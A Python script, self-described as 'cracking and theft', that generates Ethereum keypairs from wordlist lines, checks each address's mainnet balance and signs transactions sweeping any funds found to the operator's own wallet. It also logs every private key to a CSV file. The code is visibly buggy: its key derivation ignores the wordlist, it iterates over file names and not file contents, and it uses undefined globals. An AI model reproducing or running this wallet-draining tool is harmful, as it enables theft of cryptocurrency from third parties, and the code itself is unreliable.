#!/usr/bin/env python3

import os, sys, csv, eth_utils
from web3 import Web3
from eth_account.account import Account
from configparser import ConfigParser
from sys import getsizeof # Why can't we just 'import sys'?

__author__ = "Mark Rudnitsky"
__copyright__ = "(C)2022 Mark Rudnitsky"
__credits__ = ["Mark Rudnitsky"]
__license__ = "GPLv3"
__version__ = "1.1"
__maintainer__ = "Mark Rudnitsky"
__status__ = "Production"
	
# Connect to the APIs so we can interact with the Ethereum blockchain
def connect(connectionUrl):
	print("[INFO] Connecting to Ethereum mainnet ...")
	if (connectionUrl.startswith('wss')): # Websockets
		web3Instance = Web3(Web3.WebsocketProvider(connectionUrl))
	else: # HTTP(S)
		web3Instance = Web3(Web3.HTTPProvider(connectionUrl))
	# Double check our connection works
	if not web3Instance.isConnected():
		sys.exit("[ERROR] Cannot connect to given URL. Please verify you input the correct URL with no typos.")
	return web3Instance

# Use the 'entropy' parameter to create an account
def generateAddress(entropy):
	tempAcct = Account.create(extra_entropy=entropy)
	pubKey = tempAcct.address # Public key/address
	privKey = tempAcct.key # Private key
	# The below line means the private key stored in our can't always be imported into common wallets like Metamask.
	# However, it is actually human readable. Uncomment the line if you'd prefer that.
	#privKey = encode_hex(privKey)
	return pubKey, privKey

# Roll reporting into one function
def reporting(pubKey, privKey, balance):
	#header = ['Ether Wallet Public Key', 'Ether Wallet Private Key', 'ETH Balance in Wei']
	data = [pubKey, privKey, balance]
	with open(dictFileName, 'a+', encoding='UTF8', newline='') as dictionaryFile:
		writer = csv.writer(dictionaryFile)
		writer.writerow(data)

# The actual cracking and theft
def findANonZeroBalance(entropy, web3Instance):
	# Create a wallet
	pubKey, privKey = generateAddress(entropy)
	if (verbosity > 2):
		print("[INFO] Generated address: " + pubKey + " , testing for balances ...")
	
	balance = web3Instance.eth.getBalance(pubKey) # Balance in wei
	
	# Save relevant data
	reporting(pubKey, privKey, balance)

	# Jackpot
	if (balance > 0): # 1 in 2^256 chance this condition is true
		print("[SUCCESS] Balance of " + web3.fromWei(balance, 'ether') + " ETH found in " + pubKey)
		nonce = web3Instance.eth.getTransactionCount(pubKey, 'latest')
		
		# Calculate gas costs (EIP-1559 compliant)
		baseFee = int(maxGasPerTx)
		if not baseFee:
			baseFee = web3Instance.eth.getBlock("pending").baseFeePerGas
		priorityFee = web3Instance.toWei(preferredPriorityFee, 'gwei')
		marginOfSafety = 1 + float(marginOfSafety / 100)
		maxFee = web3.toWei((((2 * baseFee) + priorityFee) * marginOfSafety), 'gwei')
		
		# Generate a send-to-us transaction
		tx = {
			'from': pubKey,
			'nonce': nonce,
			'to': ourControlledWallet,
			'value': balance,
			'gas': gasCost,
			'maxFeePerGas': maxFee,
			'maxPriorityFeePerGas': priorityFee
		}

		signed_tx = web3Instance.eth.account.signTransaction(tx, privKey)
		tx_hash = web3Instance.eth.sendRawTransaction(signed_tx.rawTransaction)
		print("[SUCCESS] " + web3Instance.fromWei(balance, "ether") + " Ether transferred from " + pubKey + " to us in tx " + web3Instance.toHex(tx_hash))

# Main function
def main():
	# Set or check the values in the config file
	print("[INFO] Checking " + os.getcwd() + "/ewcconfig.ini ...")
	cfg = ConfigParser()
	configFile = os.getcwd() + "/ewcconfig.ini"
	if not os.path.exists(configFile):
		print("[ERROR] No config file data set, collecting input now ...")
		entropySourceDirectory = input(".  1) Enter your entropy source directory (Kali\'s default is /usr/share/wordlists/): ")
		dictFileName = input(".  2) Enter a CSV filename to store generated keypairs: ")
		ourControlledWallet = input(".  3) Enter the public address of the wallet to send found funds to: ")
		maxGasPerTx = input(".  3) Enter the max gas you want to pay for transactions (Enter 0 to dynamically generate based on current market conditions): ")
		marginOfSafety = input(".  4) Enter the percentage above the average gas fee you are willing to pay (0-100): ")
		preferredPriorityFee = input(".  5) Enter your preferred priority fee (Goes to Ethereum miners, a good estimate is 4): ")
		infuraKey = input(".  6) Enter your Infura API key: ")
		connectionUrlSelection = input(".  7) Are you using HTTP or WebSockets? (Choose HTTP if you don't know): ")
		if "http" in connectionUrlSelection.lower():
			connectionUrl = "https://mainnet.infura.io/v3/" + infuraKey 
		else:
			connectionUrl = "wss://mainnet.infura.io/ws/v3/" + infuraKey
		verbosity = input(".  8) Enter your preferred verbosity (0=essential, 1=per-file updates, 2=per-line updates, 3=per-address updates): ")
		cfg["EWCSETTINGS"] = {
			"entropySourceDirectory": str(entropySourceDirectory),
			"dictFileName": str(dictFileName),
			"ourControlledWallet": str(ourControlledWallet),
			"maxGasPerTx": int(maxGasPerTx),
			"marginOfSafety": int(marginOfSafety),
			"preferredPriorityFee": int(preferredPriorityFee),
			"infuraKey": str(infuraKey),
			"connectionUrl": str(connectionUrl),
			"verbosity": int(verbosity)
		}
		with open(configFile, 'w+') as conf:
			cfg.write(conf)
		print("[SUCCESS] Information saved in the configuration file " + configFile)
	else:
		cfg.read(configFile)
		cfgSettingsData = cfg["EWCSETTINGS"]
		entropySourceDirectory = str(cfgSettingsData["entropySourceDirectory"])
		dictFileName = str(cfgSettingsData["dictFileName"])
		ourControlledWallet = str(cfgSettingsData["ourControlledWallet"])
		maxGasPerTx = int(cfgSettingsData["maxGasPerTx"])
		marginOfSafety = int(cfgSettingsData["marginOfSafety"])
		preferredPriorityFee = int(cfgSettingsData["preferredPriorityFee"])
		infuraKey = str(cfgSettingsData["infuraKey"])
		connectionUrl = str(cfgSettingsData["connectionUrl"])
		verbosity = int(cfgSettingsData["verbosity"])


	# Check the API connection
	web3Instance = connect(connectionUrl)

	print("[INFO] Generating keys, this will take a while ...")
	# Open up our source of entropy
	for root, dirs, fileNames in os.walk(entropySourceDirectory):
		print("[INFO] Pulling entropy from " + fileNames + "... ")
		for sourceFile in fileNames:
			if (verbosity > 0):
				print("[INFO] Pulling entropy from " + sourceFile + "... ")

			for lineNum, textLine in enumerate(sourceFile):
				# Get the line from the file and format it for our Ethereum tools
				tempLine = str(textLine).strip()
				tempLine = bytes(tempLine, 'utf-8')

				# Generate address permutations
				tempLineByteLength = getsizeof(tempLine)

				if (verbosity > 1):
					print("[INFO] Conducting permuations on line \'" + tempLine + "\'... ")
				# Do basic entropy permutations
				# Only allowed keylengths are defined in BIP39 
				for maxByteLength in [128, 160, 192, 224, 256]:
					# Too long, just use the first or last maxByteLength bytes
					if (tempLineByteLength > maxByteLength):
						# First maxByteLength bytes
						findANonZeroBalance(tempLine[:maxByteLength], web3Instance)

						# Last maxByteLength bytes
						findANonZeroBalance(tempLine[len(tempLine) - maxByteLength:], web3Instance)

					# Edge case - line doesn't exist or isnt working
					elif (tempLineByteLength < 0):
						findANonZeroBalance('', web3Instance)

					# Proper length entropy
					else:
						pad = maxByteLength - tempLineByteLength

						# Pad on the left
						findANonZeroBalance(bytes(pad) + tempLine, web3Instance)
			
						# Pad on the right
						findANonZeroBalance(tempLine + bytes(pad), web3Instance)

						# Pad 50/50 Left/Right split
						findANonZeroBalance(bytes(int(pad / 2)) + tempLine + bytes(int(pad / 2)) + bytes(int(pad % 2)), web3Instance)
				
	print("[INFO] Keygen complete, please check \'" + dictFileName + "\' in this directory for details.")

# Redirect to main function
if __name__=="__main__":
    main()
